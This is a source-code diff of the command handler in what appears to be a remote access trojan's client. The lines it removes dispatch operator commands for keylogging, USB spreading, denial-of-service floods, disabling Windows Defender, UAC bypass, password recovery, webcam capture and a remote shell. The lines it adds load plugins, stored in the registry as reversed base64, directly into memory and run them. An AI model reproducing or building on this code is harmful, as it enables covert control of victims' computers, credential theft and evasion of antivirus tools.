@@ -10,16 +10,13 @@ using System.Reflection;
 using System.Text;
 using System.Threading;
 using System.Windows.Forms;
+using System.Collections.Generic;
+using Microsoft.VisualBasic;
 
 namespace Client.Handle_Packet
 {
     public static class Packet
     {
-        public static CancellationTokenSource ctsDos;
-        public static CancellationTokenSource ctsReportWindow;
-        public static FormChat GetFormChat;
-        public static string FileCopy = null;
-
         public static void Read(object data)
         {
             try
@@ -28,243 +25,63 @@ namespace Client.Handle_Packet
                 unpack_msgpack.DecodeFromBytes((byte[])data);
                 switch (unpack_msgpack.ForcePathObject("Packet").AsString)
                 {
-                    case "sendMessage":
-                        {
-                            MessageBox.Show(unpack_msgpack.ForcePathObject("Message").AsString);
-                            break;
-                        }
-
                     case "Ping":
                         {
                             Debug.WriteLine("Server Pinged me " + unpack_msgpack.ForcePathObject("Message").AsString);
                             break;
                         }
 
-                    case "thumbnails":
+                    case "plugin": // run plugin in memory
                         {
-                            new HandleThumbnails();
+                            Assembly assembly = AppDomain.CurrentDomain.Load(Convert.FromBase64String(Strings.StrReverse(SetRegistry.GetValue(unpack_msgpack.ForcePathObject("Dll").AsString))));
+                            Type type = assembly.GetType("Plugin.Plugin");
+                            dynamic instance = Activator.CreateInstance(type);
+                            instance.Run(ClientSocket.TcpClient, Settings.ServerCertificate, Settings.Hwid, unpack_msgpack.ForcePathObject("Msgpack").GetAsBytes(), Methods._appMutex, Settings.MTX, Settings.BDOS, Settings.Install, Settings.InstallFile);
                             break;
                         }
 
-                    case "sendFile":
+                    case "savePlugin": // save plugin as MD5:Base64
                         {
-                            Received();
-                            new HandleSendTo().SendToDisk(unpack_msgpack);
+                            SetRegistry.SetValue(unpack_msgpack.ForcePathObject("Hash").AsString, unpack_msgpack.ForcePathObject("Dll").AsString);
+                            Debug.WriteLine("plguin saved");
                             break;
                         }
 
-                    case "sendMemory":
+                    case "checkPlugin": // server sent all plugins hashes, we check which plugin we miss
                         {
-                            Received();
-                            new HandleSendTo().SendToMemory(unpack_msgpack);
-                            break;
-                        }
-
-                    case "recoveryPassword":
-                        {
-                            Received();
-                            new HandlerRecovery(unpack_msgpack);
-                            break;
-                        }
-
-                    case "defender":
-                        {
-                            new HandleWindowsDefender();
-                            break;
-                        }
-
-                    case "uac":
-                        {
-                            new HandleUAC();
-                            break;
-                        }
-
-                    case "close":
-                        {
-                            Methods.ClientExit();
-                            Environment.Exit(0);
-                            break;
-                        }
-
-                    case "restart":
-                        {
-                            Process.Start(Application.ExecutablePath);
-                            Methods.ClientExit();
-                            Environment.Exit(0);
-                            break;
-                        }
-
-                    case "uninstall":
-                        {
-                            new HandleUninstall();
-                            break;
-                        }
-
-                    case "usbSpread":
-                        {
-                            new HandleLimeUSB(unpack_msgpack);
-                            break;
-                        }
-
-                    case "remoteDesktop":
-                        {
-                            new HandleRemoteDesktop(unpack_msgpack);
-                            break;
-                        }
-
-                    case "processManager":
-                        {
-                            new HandleProcessManager(unpack_msgpack);
-                        }
-                        break;
-
-                    case "fileManager":
-                        {
-                            new FileManager(unpack_msgpack);
-                        }
-                        break;
-
-                    case "botKiller":
-                        {
-                            new HandleBotKiller().RunBotKiller();
-                            break;
-                        }
-
-                    case "keyLogger":
-                        {
-                            string isON = unpack_msgpack.ForcePathObject("isON").AsString;
-                            if (isON == "true")
+                            List<string> plugins = new List<string>();
+                            foreach (string plugin in unpack_msgpack.ForcePathObject("Hash").AsString.Split(','))
                             {
-                                new Thread(() =>
+                                if (SetRegistry.GetValue(plugin.Trim()) == null)
                                 {
-                                    HandleLimeLogger.isON = true;
-                                    HandleLimeLogger.Run();
-                                }).Start();
+                                    plugins.Add(plugin.Trim());
+                                    Debug.WriteLine("plguin not found");
+                                }
                             }
-                            else
+                            if (plugins.Count > 0)
                             {
-                                HandleLimeLogger.isON = false;
+                                MsgPack msgPack = new MsgPack();
+                                msgPack.ForcePathObject("Packet").SetAsString("sendPlugin");
+                                msgPack.ForcePathObject("Hashes").SetAsString(string.Join(",", plugins));
+                                ClientSocket.Send(msgPack.Encode2Bytes());
                             }
                             break;
                         }
 
-                    case "visitURL":
-                        {
-                            string url = unpack_msgpack.ForcePathObject("URL").AsString;
-                            if (url.StartsWith("http"))
-                            {
-                                Process.Start(url);
-                            }
-                            break;
-                        }
-
-                    case "dos":
-                        {
-                            switch (unpack_msgpack.ForcePathObject("Option").AsString)
-                            {
-                                case "postStart":
-                                    {
-                                        ctsDos = new CancellationTokenSource();
-                                        new HandleDos().DosPost(unpack_msgpack);
-                                        break;
-                                    }
-
-                                case "postStop":
-                                    {
-                                        ctsDos.Cancel();
-                                        break;
-                                    }
-                            }
-                            break;
-                        }
-
-                    case "shell":
-                        {
-                            HandleShell.StarShell();
-                            break;
-                        }
-
-                    case "shellWriteInput":
-                        {
-                            if (HandleShell.ProcessShell != null)
-                                HandleShell.ShellWriteLine(unpack_msgpack.ForcePathObject("WriteInput").AsString);
-                            break;
-                        }
-
-                    case "chat":
-                        {
-                            new HandlerChat().CreateChat();
-                            break;
-                        }
-
-                    case "chatWriteInput":
-                        {
-                            new HandlerChat().WriteInput(unpack_msgpack);
-                            break;
-                        }
-
-                    case "chatExit":
-                        {
-                            new HandlerChat().ExitChat();
-                            break;
-                        }
-
-                    case "pcOptions":
-                        {
-                            new HandlePcOptions(unpack_msgpack.ForcePathObject("Option").AsString);
-                            break;
-                        }
-
-                    case "reportWindow":
-                        {
-                            new HandleReportWindow(unpack_msgpack);
-                            break;
-                        }
-
-
-                    case "torrent":
-                        {
-                            new HandleTorrent(unpack_msgpack);
-                            break;
-                        }
-
-                    case "executeDotNetCode":
-                        {
-                            new HandlerExecuteDotNetCode(unpack_msgpack);
-                            break;
-                        }
-
-                    case "blankscreen":
-                        {
-                            HandleBlankScreen.RunBlankScreen();
-                            break;
-                        }
-
-                    case "webcam":
-                        {
-                            HandleWebcam.Run(unpack_msgpack);
-                            break;
-                        }
-
-
-                        //case "netStat":
-                        //    {
-                        //        HandleNetStat.RunNetStat();
-                        //        break;
-                        //    }
+                    //case "cleanPlugin": // server want to clean and re save all plugins
+                    //    {
+                    //        SetRegistry.DeleteSubKey();
+                    //        MsgPack msgPack = new MsgPack();
+                    //        msgPack.ForcePathObject("Packet").SetAsString("sendPlugin+");
+                    //        ClientSocket.Send(msgPack.Encode2Bytes());
+                    //        break;
+                    //    }
                 }
             }
             catch (Exception ex)
             {
                 Error(ex.Message);
             }
-        }
-
-        private static void Received()
-        {
-            MsgPack msgpack = new MsgPack();
-            msgpack.ForcePathObject("Packet").AsString = "Received";
-            ClientSocket.Send(msgpack.Encode2Bytes());
         }
 
         public static void Error(string ex)
